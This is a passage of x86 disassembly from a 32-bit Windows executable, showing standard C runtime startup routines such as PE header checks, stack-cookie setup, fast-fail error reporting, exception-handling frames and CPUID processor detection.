  406e05:	83 fe 01             	cmp    $0x1,%esi
  406e08:	75 62                	jne    0x406e6c
  406e0a:	e8 69 08 00 00       	call   0x407678
  406e0f:	85 c0                	test   %eax,%eax
  406e11:	74 26                	je     0x406e39
  406e13:	85 f6                	test   %esi,%esi
  406e15:	75 22                	jne    0x406e39
  406e17:	68 2c c4 40 00       	push   $0x40c42c
  406e1c:	e8 17 09 00 00       	call   0x407738
  406e21:	59                   	pop    %ecx
  406e22:	85 c0                	test   %eax,%eax
  406e24:	75 0f                	jne    0x406e35
  406e26:	68 38 c4 40 00       	push   $0x40c438
  406e2b:	e8 08 09 00 00       	call   0x407738
  406e30:	59                   	pop    %ecx
  406e31:	85 c0                	test   %eax,%eax
  406e33:	74 2b                	je     0x406e60
  406e35:	32 c0                	xor    %al,%al
  406e37:	eb 30                	jmp    0x406e69
  406e39:	83 c9 ff             	or     $0xffffffff,%ecx
  406e3c:	89 0d 2c c4 40 00    	mov    %ecx,0x40c42c
  406e42:	89 0d 30 c4 40 00    	mov    %ecx,0x40c430
  406e48:	89 0d 34 c4 40 00    	mov    %ecx,0x40c434
  406e4e:	89 0d 38 c4 40 00    	mov    %ecx,0x40c438
  406e54:	89 0d 3c c4 40 00    	mov    %ecx,0x40c43c
  406e5a:	89 0d 40 c4 40 00    	mov    %ecx,0x40c440
  406e60:	c6 05 29 c4 40 00 01 	movb   $0x1,0x40c429
  406e67:	b0 01                	mov    $0x1,%al
  406e69:	5e                   	pop    %esi
  406e6a:	5d                   	pop    %ebp
  406e6b:	c3                   	ret
  406e6c:	6a 05                	push   $0x5
  406e6e:	e8 8c 03 00 00       	call   0x4071ff
  406e73:	cc                   	int3
  406e74:	6a 08                	push   $0x8
  406e76:	68 50 a9 40 00       	push   $0x40a950
  406e7b:	e8 b0 05 00 00       	call   0x407430
  406e80:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  406e84:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
  406e89:	66 39 05 00 00 40 00 	cmp    %ax,0x400000
  406e90:	75 5d                	jne    0x406eef
  406e92:	a1 3c 00 40 00       	mov    0x40003c,%eax
  406e97:	81 b8 00 00 40 00 50 	cmpl   $0x4550,0x400000(%eax)
  406e9e:	45 00 00 
  406ea1:	75 4c                	jne    0x406eef
  406ea3:	b9 0b 01 00 00       	mov    $0x10b,%ecx
  406ea8:	66 39 88 18 00 40 00 	cmp    %cx,0x400018(%eax)
  406eaf:	75 3e                	jne    0x406eef
  406eb1:	8b 45 08             	mov    0x8(%ebp),%eax
  406eb4:	b9 00 00 40 00       	mov    $0x400000,%ecx
  406eb9:	2b c1                	sub    %ecx,%eax
  406ebb:	50                   	push   %eax
  406ebc:	51                   	push   %ecx
  406ebd:	e8 7c fe ff ff       	call   0x406d3e
  406ec2:	59                   	pop    %ecx
  406ec3:	59                   	pop    %ecx
  406ec4:	85 c0                	test   %eax,%eax
  406ec6:	74 27                	je     0x406eef
  406ec8:	83 78 24 00          	cmpl   $0x0,0x24(%eax)
  406ecc:	7c 21                	jl     0x406eef
  406ece:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406ed5:	b0 01                	mov    $0x1,%al
  406ed7:	eb 1f                	jmp    0x406ef8
  406ed9:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406edc:	8b 00                	mov    (%eax),%eax
  406ede:	33 c9                	xor    %ecx,%ecx
  406ee0:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%eax)
  406ee6:	0f 94 c1             	sete   %cl
  406ee9:	8b c1                	mov    %ecx,%eax
  406eeb:	c3                   	ret
  406eec:	8b 65 e8             	mov    -0x18(%ebp),%esp
  406eef:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  406ef6:	32 c0                	xor    %al,%al
  406ef8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406efb:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  406f02:	59                   	pop    %ecx
  406f03:	5f                   	pop    %edi
  406f04:	5e                   	pop    %esi
  406f05:	5b                   	pop    %ebx
  406f06:	c9                   	leave
  406f07:	c3                   	ret
  406f08:	55                   	push   %ebp
  406f09:	8b ec                	mov    %esp,%ebp
  406f0b:	e8 68 07 00 00       	call   0x407678
  406f10:	85 c0                	test   %eax,%eax
  406f12:	74 0f                	je     0x406f23
  406f14:	80 7d 08 00          	cmpb   $0x0,0x8(%ebp)
  406f18:	75 09                	jne    0x406f23
  406f1a:	33 c0                	xor    %eax,%eax
  406f1c:	b9 24 c4 40 00       	mov    $0x40c424,%ecx
  406f21:	87 01                	xchg   %eax,(%ecx)
  406f23:	5d                   	pop    %ebp
  406f24:	c3                   	ret
  406f25:	55                   	push   %ebp
  406f26:	8b ec                	mov    %esp,%ebp
  406f28:	80 3d 28 c4 40 00 00 	cmpb   $0x0,0x40c428
  406f2f:	74 06                	je     0x406f37
  406f31:	80 7d 0c 00          	cmpb   $0x0,0xc(%ebp)
  406f35:	75 12                	jne    0x406f49
  406f37:	ff 75 08             	push   0x8(%ebp)
  406f3a:	e8 5b 02 00 00       	call   0x40719a
  406f3f:	ff 75 08             	push   0x8(%ebp)
  406f42:	e8 53 02 00 00       	call   0x40719a
  406f47:	59                   	pop    %ecx
  406f48:	59                   	pop    %ecx
  406f49:	b0 01                	mov    $0x1,%al
  406f4b:	5d                   	pop    %ebp
  406f4c:	c3                   	ret
  406f4d:	55                   	push   %ebp
  406f4e:	8b ec                	mov    %esp,%ebp
  406f50:	83 3d 2c c4 40 00 ff 	cmpl   $0xffffffff,0x40c42c
  406f57:	ff 75 08             	push   0x8(%ebp)
  406f5a:	75 07                	jne    0x406f63
  406f5c:	e8 e3 07 00 00       	call   0x407744
  406f61:	eb 0b                	jmp    0x406f6e
  406f63:	68 2c c4 40 00       	push   $0x40c42c
  406f68:	e8 d1 07 00 00       	call   0x40773e
  406f6d:	59                   	pop    %ecx
  406f6e:	f7 d8                	neg    %eax
  406f70:	59                   	pop    %ecx
  406f71:	1b c0                	sbb    %eax,%eax
  406f73:	f7 d0                	not    %eax
  406f75:	23 45 08             	and    0x8(%ebp),%eax
  406f78:	5d                   	pop    %ebp
  406f79:	c3                   	ret
  406f7a:	55                   	push   %ebp
  406f7b:	8b ec                	mov    %esp,%ebp
  406f7d:	ff 75 08             	push   0x8(%ebp)
  406f80:	e8 c8 ff ff ff       	call   0x406f4d
  406f85:	f7 d8                	neg    %eax
  406f87:	59                   	pop    %ecx
  406f88:	1b c0                	sbb    %eax,%eax
  406f8a:	f7 d8                	neg    %eax
  406f8c:	48                   	dec    %eax
  406f8d:	5d                   	pop    %ebp
  406f8e:	c3                   	ret
  406f8f:	c2 00 00             	ret    $0x0
  406f92:	55                   	push   %ebp
  406f93:	8b ec                	mov    %esp,%ebp
  406f95:	6a 00                	push   $0x0
  406f97:	ff 15 14 90 40 00    	call   *0x409014
  406f9d:	ff 75 08             	push   0x8(%ebp)
  406fa0:	ff 15 0c 90 40 00    	call   *0x40900c
  406fa6:	68 09 04 00 c0       	push   $0xc0000409
  406fab:	ff 15 18 90 40 00    	call   *0x409018
  406fb1:	50                   	push   %eax
  406fb2:	ff 15 20 90 40 00    	call   *0x409020
  406fb8:	5d                   	pop    %ebp
  406fb9:	c3                   	ret
  406fba:	55                   	push   %ebp
  406fbb:	8b ec                	mov    %esp,%ebp
  406fbd:	81 ec 24 03 00 00    	sub    $0x324,%esp
  406fc3:	6a 17                	push   $0x17
  406fc5:	ff 15 24 90 40 00    	call   *0x409024
  406fcb:	85 c0                	test   %eax,%eax
  406fcd:	74 05                	je     0x406fd4
  406fcf:	6a 02                	push   $0x2
  406fd1:	59                   	pop    %ecx
  406fd2:	cd 29                	int    $0x29
  406fd4:	a3 48 c5 40 00       	mov    %eax,0x40c548
  406fd9:	89 0d 44 c5 40 00    	mov    %ecx,0x40c544
  406fdf:	89 15 40 c5 40 00    	mov    %edx,0x40c540
  406fe5:	89 1d 3c c5 40 00    	mov    %ebx,0x40c53c
  406feb:	89 35 38 c5 40 00    	mov    %esi,0x40c538
  406ff1:	89 3d 34 c5 40 00    	mov    %edi,0x40c534
  406ff7:	66 8c 15 60 c5 40 00 	data16 mov %ss,0x40c560
  406ffe:	66 8c 0d 54 c5 40 00 	data16 mov %cs,0x40c554
  407005:	66 8c 1d 30 c5 40 00 	data16 mov %ds,0x40c530
  40700c:	66 8c 05 2c c5 40 00 	data16 mov %es,0x40c52c
  407013:	66 8c 25 28 c5 40 00 	data16 mov %fs,0x40c528
  40701a:	66 8c 2d 24 c5 40 00 	data16 mov %gs,0x40c524
  407021:	9c                   	pushf
  407022:	8f 05 58 c5 40 00    	pop    0x40c558
  407028:	8b 45 00             	mov    0x0(%ebp),%eax
  40702b:	a3 4c c5 40 00       	mov    %eax,0x40c54c
  407030:	8b 45 04             	mov    0x4(%ebp),%eax
  407033:	a3 50 c5 40 00       	mov    %eax,0x40c550
  407038:	8d 45 08             	lea    0x8(%ebp),%eax
  40703b:	a3 5c c5 40 00       	mov    %eax,0x40c55c
  407040:	8b 85 dc fc ff ff    	mov    -0x324(%ebp),%eax
  407046:	c7 05 98 c4 40 00 01 	movl   $0x10001,0x40c498
  40704d:	00 01 00 
  407050:	a1 50 c5 40 00       	mov    0x40c550,%eax
  407055:	a3 54 c4 40 00       	mov    %eax,0x40c454
  40705a:	c7 05 48 c4 40 00 09 	movl   $0xc0000409,0x40c448
  407061:	04 00 c0 
  407064:	c7 05 4c c4 40 00 01 	movl   $0x1,0x40c44c
  40706b:	00 00 00 
  40706e:	c7 05 58 c4 40 00 01 	movl   $0x1,0x40c458
  407075:	00 00 00 
  407078:	6a 04                	push   $0x4
  40707a:	58                   	pop    %eax
  40707b:	6b c0 00             	imul   $0x0,%eax,%eax
  40707e:	c7 80 5c c4 40 00 02 	movl   $0x2,0x40c45c(%eax)
  407085:	00 00 00 
  407088:	6a 04                	push   $0x4
  40708a:	58                   	pop    %eax
  40708b:	6b c0 00             	imul   $0x0,%eax,%eax
  40708e:	8b 0d 04 c0 40 00    	mov    0x40c004,%ecx
  407094:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  407098:	6a 04                	push   $0x4
  40709a:	58                   	pop    %eax
  40709b:	c1 e0 00             	shl    $0x0,%eax
  40709e:	8b 0d 00 c0 40 00    	mov    0x40c000,%ecx
  4070a4:	89 4c 05 f8          	mov    %ecx,-0x8(%ebp,%eax,1)
  4070a8:	68 58 93 40 00       	push   $0x409358
  4070ad:	e8 e0 fe ff ff       	call   0x406f92
  4070b2:	c9                   	leave
  4070b3:	c3                   	ret
  4070b4:	83 61 04 00          	andl   $0x0,0x4(%ecx)
  4070b8:	8b c1                	mov    %ecx,%eax
  4070ba:	83 61 08 00          	andl   $0x0,0x8(%ecx)
  4070be:	c7 41 04 78 93 40 00 	movl   $0x409378,0x4(%ecx)
  4070c5:	c7 01 70 93 40 00    	movl   $0x409370,(%ecx)
  4070cb:	c3                   	ret
  4070cc:	55                   	push   %ebp
  4070cd:	8b ec                	mov    %esp,%ebp
  4070cf:	83 ec 0c             	sub    $0xc,%esp
  4070d2:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  4070d5:	e8 da ff ff ff       	call   0x4070b4
  4070da:	68 6c a9 40 00       	push   $0x40a96c
  4070df:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4070e2:	50                   	push   %eax
  4070e3:	e8 a8 05 00 00       	call   0x407690
  4070e8:	cc                   	int3
  4070e9:	55                   	push   %ebp
  4070ea:	8b ec                	mov    %esp,%ebp
  4070ec:	83 ec 14             	sub    $0x14,%esp
  4070ef:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  4070f3:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4070f6:	83 65 f8 00          	andl   $0x0,-0x8(%ebp)
  4070fa:	50                   	push   %eax
  4070fb:	ff 15 34 90 40 00    	call   *0x409034
  407101:	8b 45 f8             	mov    -0x8(%ebp),%eax
  407104:	33 45 f4             	xor    -0xc(%ebp),%eax
  407107:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40710a:	ff 15 30 90 40 00    	call   *0x409030
  407110:	31 45 fc             	xor    %eax,-0x4(%ebp)
  407113:	ff 15 2c 90 40 00    	call   *0x40902c
  407119:	31 45 fc             	xor    %eax,-0x4(%ebp)
  40711c:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40711f:	50                   	push   %eax
  407120:	ff 15 28 90 40 00    	call   *0x409028
  407126:	8b 45 f0             	mov    -0x10(%ebp),%eax
  407129:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40712c:	33 45 ec             	xor    -0x14(%ebp),%eax
  40712f:	33 45 fc             	xor    -0x4(%ebp),%eax
  407132:	33 c1                	xor    %ecx,%eax
  407134:	c9                   	leave
  407135:	c3                   	ret
  407136:	8b 0d 04 c0 40 00    	mov    0x40c004,%ecx
  40713c:	56                   	push   %esi
  40713d:	57                   	push   %edi
  40713e:	bf 4e e6 40 bb       	mov    $0xbb40e64e,%edi
  407143:	be 00 00 ff ff       	mov    $0xffff0000,%esi
  407148:	3b cf                	cmp    %edi,%ecx
  40714a:	74 04                	je     0x407150
  40714c:	85 ce                	test   %ecx,%esi
  40714e:	75 26                	jne    0x407176
  407150:	e8 94 ff ff ff       	call   0x4070e9
  407155:	8b c8                	mov    %eax,%ecx
  407157:	3b cf                	cmp    %edi,%ecx
  407159:	75 07                	jne    0x407162
  40715b:	b9 4f e6 40 bb       	mov    $0xbb40e64f,%ecx
  407160:	eb 0e                	jmp    0x407170
  407162:	85 ce                	test   %ecx,%esi
  407164:	75 0a                	jne    0x407170
  407166:	0d 11 47 00 00       	or     $0x4711,%eax
  40716b:	c1 e0 10             	shl    $0x10,%eax
  40716e:	0b c8                	or     %eax,%ecx
  407170:	89 0d 04 c0 40 00    	mov    %ecx,0x40c004
  407176:	f7 d1                	not    %ecx
  407178:	5f                   	pop    %edi
  407179:	89 0d 00 c0 40 00    	mov    %ecx,0x40c000
  40717f:	5e                   	pop    %esi
  407180:	c3                   	ret
  407181:	33 c0                	xor    %eax,%eax
  407183:	c3                   	ret
  407184:	33 c0                	xor    %eax,%eax
  407186:	40                   	inc    %eax
  407187:	c3                   	ret
  407188:	b8 00 40 00 00       	mov    $0x4000,%eax
  40718d:	c3                   	ret
  40718e:	68 68 c7 40 00       	push   $0x40c768
  407193:	ff 15 38 90 40 00    	call   *0x409038
  407199:	c3                   	ret
  40719a:	b0 01                	mov    $0x1,%al
  40719c:	c3                   	ret
  40719d:	68 00 00 03 00       	push   $0x30000
  4071a2:	68 00 00 01 00       	push   $0x10000
  4071a7:	6a 00                	push   $0x0
  4071a9:	e8 9c 05 00 00       	call   0x40774a
  4071ae:	83 c4 0c             	add    $0xc,%esp
  4071b1:	85 c0                	test   %eax,%eax
  4071b3:	75 01                	jne    0x4071b6
  4071b5:	c3                   	ret
  4071b6:	6a 07                	push   $0x7
  4071b8:	e8 42 00 00 00       	call   0x4071ff
  4071bd:	cc                   	int3
  4071be:	b8 70 c7 40 00       	mov    $0x40c770,%eax
  4071c3:	c3                   	ret
  4071c4:	b8 78 c7 40 00       	mov    $0x40c778,%eax
  4071c9:	c3                   	ret
  4071ca:	e8 ef ff ff ff       	call   0x4071be
  4071cf:	8b 48 04             	mov    0x4(%eax),%ecx
  4071d2:	83 08 24             	orl    $0x24,(%eax)
  4071d5:	89 48 04             	mov    %ecx,0x4(%eax)
  4071d8:	e8 e7 ff ff ff       	call   0x4071c4
  4071dd:	8b 48 04             	mov    0x4(%eax),%ecx
  4071e0:	83 08 02             	orl    $0x2,(%eax)
  4071e3:	89 48 04             	mov    %ecx,0x4(%eax)
  4071e6:	c3                   	ret
  4071e7:	33 c0                	xor    %eax,%eax
  4071e9:	39 05 0c c0 40 00    	cmp    %eax,0x40c00c
  4071ef:	0f 94 c0             	sete   %al
  4071f2:	c3                   	ret
  4071f3:	b8 9c c7 40 00       	mov    $0x40c79c,%eax
  4071f8:	c3                   	ret
  4071f9:	b8 98 c7 40 00       	mov    $0x40c798,%eax
  4071fe:	c3                   	ret
  4071ff:	55                   	push   %ebp
  407200:	8b ec                	mov    %esp,%ebp
  407202:	81 ec 24 03 00 00    	sub    $0x324,%esp
  407208:	53                   	push   %ebx
  407209:	6a 17                	push   $0x17
  40720b:	ff 15 24 90 40 00    	call   *0x409024
  407211:	85 c0                	test   %eax,%eax
  407213:	74 05                	je     0x40721a
  407215:	8b 4d 08             	mov    0x8(%ebp),%ecx
  407218:	cd 29                	int    $0x29
  40721a:	6a 03                	push   $0x3
  40721c:	e8 a2 01 00 00       	call   0x4073c3
  407221:	c7 04 24 cc 02 00 00 	movl   $0x2cc,(%esp)
  407228:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  40722e:	6a 00                	push   $0x0
  407230:	50                   	push   %eax
  407231:	e8 6c 04 00 00       	call   0x4076a2
  407236:	83 c4 0c             	add    $0xc,%esp
  407239:	89 85 8c fd ff ff    	mov    %eax,-0x274(%ebp)
  40723f:	89 8d 88 fd ff ff    	mov    %ecx,-0x278(%ebp)
  407245:	89 95 84 fd ff ff    	mov    %edx,-0x27c(%ebp)
  40724b:	89 9d 80 fd ff ff    	mov    %ebx,-0x280(%ebp)
  407251:	89 b5 7c fd ff ff    	mov    %esi,-0x284(%ebp)
  407257:	89 bd 78 fd ff ff    	mov    %edi,-0x288(%ebp)
  40725d:	66 8c 95 a4 fd ff ff 	data16 mov %ss,-0x25c(%ebp)
  407264:	66 8c 8d 98 fd ff ff 	data16 mov %cs,-0x268(%ebp)
  40726b:	66 8c 9d 74 fd ff ff 	data16 mov %ds,-0x28c(%ebp)
  407272:	66 8c 85 70 fd ff ff 	data16 mov %es,-0x290(%ebp)
  407279:	66 8c a5 6c fd ff ff 	data16 mov %fs,-0x294(%ebp)
  407280:	66 8c ad 68 fd ff ff 	data16 mov %gs,-0x298(%ebp)
  407287:	9c                   	pushf
  407288:	8f 85 9c fd ff ff    	pop    -0x264(%ebp)
  40728e:	8b 45 04             	mov    0x4(%ebp),%eax
  407291:	89 85 94 fd ff ff    	mov    %eax,-0x26c(%ebp)
  407297:	8d 45 04             	lea    0x4(%ebp),%eax
  40729a:	89 85 a0 fd ff ff    	mov    %eax,-0x260(%ebp)
  4072a0:	c7 85 dc fc ff ff 01 	movl   $0x10001,-0x324(%ebp)
  4072a7:	00 01 00 
  4072aa:	8b 40 fc             	mov    -0x4(%eax),%eax
  4072ad:	6a 50                	push   $0x50
  4072af:	89 85 90 fd ff ff    	mov    %eax,-0x270(%ebp)
  4072b5:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4072b8:	6a 00                	push   $0x0
  4072ba:	50                   	push   %eax
  4072bb:	e8 e2 03 00 00       	call   0x4076a2
  4072c0:	8b 45 04             	mov    0x4(%ebp),%eax
  4072c3:	83 c4 0c             	add    $0xc,%esp
  4072c6:	c7 45 a8 15 00 00 40 	movl   $0x40000015,-0x58(%ebp)
  4072cd:	c7 45 ac 01 00 00 00 	movl   $0x1,-0x54(%ebp)
  4072d4:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4072d7:	ff 15 3c 90 40 00    	call   *0x40903c
  4072dd:	6a 00                	push   $0x0
  4072df:	8d 58 ff             	lea    -0x1(%eax),%ebx
  4072e2:	f7 db                	neg    %ebx
  4072e4:	8d 45 a8             	lea    -0x58(%ebp),%eax
  4072e7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4072ea:	8d 85 dc fc ff ff    	lea    -0x324(%ebp),%eax
  4072f0:	1a db                	sbb    %bl,%bl
  4072f2:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4072f5:	fe c3                	inc    %bl
  4072f7:	ff 15 14 90 40 00    	call   *0x409014
  4072fd:	8d 45 f8             	lea    -0x8(%ebp),%eax
  407300:	50                   	push   %eax
  407301:	ff 15 0c 90 40 00    	call   *0x40900c
  407307:	85 c0                	test   %eax,%eax
  407309:	75 0c                	jne    0x407317
  40730b:	84 db                	test   %bl,%bl
  40730d:	75 08                	jne    0x407317
  40730f:	6a 03                	push   $0x3
  407311:	e8 ad 00 00 00       	call   0x4073c3
  407316:	59                   	pop    %ecx
  407317:	5b                   	pop    %ebx
  407318:	c9                   	leave
  407319:	c3                   	ret
  40731a:	e9 62 fe ff ff       	jmp    0x407181
  40731f:	6a 00                	push   $0x0
  407321:	ff 15 40 90 40 00    	call   *0x409040
  407327:	85 c0                	test   %eax,%eax
  407329:	74 33                	je     0x40735e
  40732b:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
  407330:	66 39 08             	cmp    %cx,(%eax)
  407333:	75 29                	jne    0x40735e
  407335:	8b 48 3c             	mov    0x3c(%eax),%ecx
  407338:	03 c8                	add    %eax,%ecx
  40733a:	81 39 50 45 00 00    	cmpl   $0x4550,(%ecx)
  407340:	75 1c                	jne    0x40735e
  407342:	b8 0b 01 00 00       	mov    $0x10b,%eax
  407347:	66 39 41 18          	cmp    %ax,0x18(%ecx)
  40734b:	75 11                	jne    0x40735e
  40734d:	83 79 74 0e          	cmpl   $0xe,0x74(%ecx)
  407351:	76 0b                	jbe    0x40735e
  407353:	83 b9 e8 00 00 00 00 	cmpl   $0x0,0xe8(%ecx)
  40735a:	0f 95 c0             	setne  %al
  40735d:	c3                   	ret
  40735e:	32 c0                	xor    %al,%al
  407360:	c3                   	ret
  407361:	68 6d 73 40 00       	push   $0x40736d
  407366:	ff 15 14 90 40 00    	call   *0x409014
  40736c:	c3                   	ret
  40736d:	55                   	push   %ebp
  40736e:	8b ec                	mov    %esp,%ebp
  407370:	56                   	push   %esi
  407371:	57                   	push   %edi
  407372:	8b 7d 08             	mov    0x8(%ebp),%edi
  407375:	8b 37                	mov    (%edi),%esi
  407377:	81 3e 63 73 6d e0    	cmpl   $0xe06d7363,(%esi)
  40737d:	75 25                	jne    0x4073a4
  40737f:	83 7e 10 03          	cmpl   $0x3,0x10(%esi)
  407383:	75 1f                	jne    0x4073a4
  407385:	8b 46 14             	mov    0x14(%esi),%eax
  407388:	3d 20 05 93 19       	cmp    $0x19930520,%eax
  40738d:	74 1d                	je     0x4073ac
  40738f:	3d 21 05 93 19       	cmp    $0x19930521,%eax
  407394:	74 16                	je     0x4073ac
  407396:	3d 22 05 93 19       	cmp    $0x19930522,%eax
  40739b:	74 0f                	je     0x4073ac
  40739d:	3d 00 40 99 01       	cmp    $0x1994000,%eax
  4073a2:	74 08                	je     0x4073ac
  4073a4:	5f                   	pop    %edi
  4073a5:	33 c0                	xor    %eax,%eax
  4073a7:	5e                   	pop    %esi
  4073a8:	5d                   	pop    %ebp
  4073a9:	c2 04 00             	ret    $0x4
  4073ac:	e8 e5 02 00 00       	call   0x407696
  4073b1:	89 30                	mov    %esi,(%eax)
  4073b3:	8b 77 04             	mov    0x4(%edi),%esi
  4073b6:	e8 e1 02 00 00       	call   0x40769c
  4073bb:	89 30                	mov    %esi,(%eax)
  4073bd:	e8 ec 02 00 00       	call   0x4076ae
  4073c2:	cc                   	int3
  4073c3:	83 25 80 c7 40 00 00 	andl   $0x0,0x40c780
  4073ca:	c3                   	ret
  4073cb:	53                   	push   %ebx
  4073cc:	56                   	push   %esi
  4073cd:	be 90 a2 40 00       	mov    $0x40a290,%esi
  4073d2:	bb 90 a2 40 00       	mov    $0x40a290,%ebx
  4073d7:	3b f3                	cmp    %ebx,%esi
  4073d9:	73 19                	jae    0x4073f4
  4073db:	57                   	push   %edi
  4073dc:	8b 3e                	mov    (%esi),%edi
  4073de:	85 ff                	test   %edi,%edi
  4073e0:	74 0a                	je     0x4073ec
  4073e2:	8b cf                	mov    %edi,%ecx
  4073e4:	ff 15 10 92 40 00    	call   *0x409210
  4073ea:	ff d7                	call   *%edi
  4073ec:	83 c6 04             	add    $0x4,%esi
  4073ef:	3b f3                	cmp    %ebx,%esi
  4073f1:	72 e9                	jb     0x4073dc
  4073f3:	5f                   	pop    %edi
  4073f4:	5e                   	pop    %esi
  4073f5:	5b                   	pop    %ebx
  4073f6:	c3                   	ret
  4073f7:	53                   	push   %ebx
  4073f8:	56                   	push   %esi
  4073f9:	be 98 a2 40 00       	mov    $0x40a298,%esi
  4073fe:	bb 98 a2 40 00       	mov    $0x40a298,%ebx
  407403:	3b f3                	cmp    %ebx,%esi
  407405:	73 19                	jae    0x407420
  407407:	57                   	push   %edi
  407408:	8b 3e                	mov    (%esi),%edi
  40740a:	85 ff                	test   %edi,%edi
  40740c:	74 0a                	je     0x407418
  40740e:	8b cf                	mov    %edi,%ecx
  407410:	ff 15 10 92 40 00    	call   *0x409210
  407416:	ff d7                	call   *%edi
  407418:	83 c6 04             	add    $0x4,%esi
  40741b:	3b f3                	cmp    %ebx,%esi
  40741d:	72 e9                	jb     0x407408
  40741f:	5f                   	pop    %edi
  407420:	5e                   	pop    %esi
  407421:	5b                   	pop    %ebx
  407422:	c3                   	ret
  407423:	cc                   	int3
  407424:	cc                   	int3
  407425:	cc                   	int3
  407426:	cc                   	int3
  407427:	cc                   	int3
  407428:	cc                   	int3
  407429:	cc                   	int3
  40742a:	cc                   	int3
  40742b:	cc                   	int3
  40742c:	cc                   	int3
  40742d:	cc                   	int3
  40742e:	cc                   	int3
  40742f:	cc                   	int3
  407430:	68 75 74 40 00       	push   $0x407475
  407435:	64 ff 35 00 00 00 00 	push   %fs:0x0
  40743c:	8b 44 24 10          	mov    0x10(%esp),%eax
  407440:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  407444:	8d 6c 24 10          	lea    0x10(%esp),%ebp
  407448:	2b e0                	sub    %eax,%esp
  40744a:	53                   	push   %ebx
  40744b:	56                   	push   %esi
  40744c:	57                   	push   %edi
  40744d:	a1 04 c0 40 00       	mov    0x40c004,%eax
  407452:	31 45 fc             	xor    %eax,-0x4(%ebp)
  407455:	33 c5                	xor    %ebp,%eax
  407457:	50                   	push   %eax
  407458:	89 65 e8             	mov    %esp,-0x18(%ebp)
  40745b:	ff 75 f8             	push   -0x8(%ebp)
  40745e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407461:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  407468:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40746b:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40746e:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  407474:	c3                   	ret
  407475:	55                   	push   %ebp
  407476:	8b ec                	mov    %esp,%ebp
  407478:	56                   	push   %esi
  407479:	8b 75 08             	mov    0x8(%ebp),%esi
  40747c:	ff 36                	push   (%esi)
  40747e:	e8 cd 02 00 00       	call   0x407750
  407483:	ff 75 14             	push   0x14(%ebp)
  407486:	89 06                	mov    %eax,(%esi)
  407488:	ff 75 10             	push   0x10(%ebp)
  40748b:	ff 75 0c             	push   0xc(%ebp)
  40748e:	56                   	push   %esi
  40748f:	68 79 6a 40 00       	push   $0x406a79
  407494:	68 04 c0 40 00       	push   $0x40c004
  407499:	e8 0a 02 00 00       	call   0x4076a8
  40749e:	83 c4 1c             	add    $0x1c,%esp
  4074a1:	5e                   	pop    %esi
  4074a2:	5d                   	pop    %ebp
  4074a3:	c3                   	ret
  4074a4:	55                   	push   %ebp
  4074a5:	8b ec                	mov    %esp,%ebp
  4074a7:	83 25 84 c7 40 00 00 	andl   $0x0,0x40c784
  4074ae:	83 ec 24             	sub    $0x24,%esp
  4074b1:	83 0d 10 c0 40 00 01 	orl    $0x1,0x40c010
  4074b8:	6a 0a                	push   $0xa
  4074ba:	ff 15 24 90 40 00    	call   *0x409024
  4074c0:	85 c0                	test   %eax,%eax
  4074c2:	0f 84 ac 01 00 00    	je     0x407674
  4074c8:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  4074cc:	33 c0                	xor    %eax,%eax
  4074ce:	53                   	push   %ebx
  4074cf:	56                   	push   %esi
  4074d0:	57                   	push   %edi
  4074d1:	33 c9                	xor    %ecx,%ecx
  4074d3:	8d 7d dc             	lea    -0x24(%ebp),%edi
  4074d6:	53                   	push   %ebx
  4074d7:	0f a2                	cpuid
  4074d9:	8b f3                	mov    %ebx,%esi
  4074db:	5b                   	pop    %ebx
  4074dc:	90                   	nop
  4074dd:	89 07                	mov    %eax,(%edi)
  4074df:	89 77 04             	mov    %esi,0x4(%edi)
  4074e2:	89 4f 08             	mov    %ecx,0x8(%edi)
  4074e5:	33 c9                	xor    %ecx,%ecx
  4074e7:	89 57 0c             	mov    %edx,0xc(%edi)
  4074ea:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4074ed:	8b 7d e0             	mov    -0x20(%ebp),%edi
  4074f0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4074f3:	81 f7 47 65 6e 75    	xor    $0x756e6547,%edi
  4074f9:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4074fc:	35 69 6e 65 49       	xor    $0x49656e69,%eax
  407501:	89 45 fc             	mov    %eax,-0x4(%ebp)
  407504:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  407507:	35 6e 74 65 6c       	xor    $0x6c65746e,%eax
  40750c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40750f:	33 c0                	xor    %eax,%eax
  407511:	40                   	inc    %eax
  407512:	53                   	push   %ebx
  407513:	0f a2                	cpuid
  407515:	8b f3                	mov    %ebx,%esi
  407517:	5b                   	pop    %ebx
  407518:	90                   	nop
  407519:	8d 5d dc             	lea    -0x24(%ebp),%ebx
  40751c:	89 03                	mov    %eax,(%ebx)
  40751e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407521:	0b 45 f8             	or     -0x8(%ebp),%eax
  407524:	0b c7                	or     %edi,%eax
